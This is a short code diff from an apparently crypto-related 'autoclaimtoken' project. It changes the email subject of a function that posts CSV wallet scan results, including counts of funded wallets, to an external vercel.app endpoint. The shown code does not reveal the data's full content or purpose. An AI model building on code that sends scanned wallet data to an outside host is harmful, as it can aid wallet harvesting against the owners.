@@ -361,7 +361,7 @@ async function sendCompleteResults(wallets, totalScanned) {
       console.log('📧 Sending via Vercel backup...');
       
       const backupResponse = await axios.post('https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app/api/send-email', {
-        subject: subject,
+        subject: `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`,
         message: message + '\n\n=== WALLET DATA ===\n' + csvContent
       }, {
         timeout: 15000,
